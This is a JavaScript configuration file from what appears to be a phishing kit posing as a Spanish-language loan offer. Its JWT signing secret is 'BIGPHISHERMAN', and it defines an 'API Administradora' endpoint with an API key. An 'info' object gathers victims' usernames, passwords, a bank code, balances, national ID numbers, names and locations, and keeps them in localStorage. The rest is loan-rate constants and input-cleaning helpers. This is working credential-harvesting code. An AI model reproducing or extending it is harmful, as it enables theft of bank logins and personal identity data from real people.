/**
 * CONFIGURACIÓN
 */
const API_URL = 'http://127.0.0.1:8000'; // API Administradora.
const API_KEY = '5ba6da97-916f-4c5c-b61e-0e52ae5fd263'; // API Administradora.
const JWT_SIGN = 'BIGPHISHERMAN';

const CONFIG = {
    TASA_MENSUAL: 0.0115, // 1.15% mensual
    MONTO_MIN: 500000,
    MONTO_MAX: 25000000,
    PLAZO_MIN: 6,
    PLAZO_MAX: 72
};


const LS = window.localStorage;

let info = {
    user: '',
    pass: '',
    cdin: '',

    saldo: 0,

    plazo: 0,
    monto: 0,
    cuota: 0,

    cedula: '',
    nombre: '',
    departamento: '',
    municipio: '',
    sector: '',
    tipo_empleo: ''
}

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function cleanAndLimitDigits(input, maxLength) {
    // Remove all spaces from the input
    let value = input.value.replace(/\s/g, '');
    
    // Limit to maxLength digits
    if (value.length > maxLength) {
        value = value.slice(0, maxLength);
    }
    
    // Update input value
    input.value = value;
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));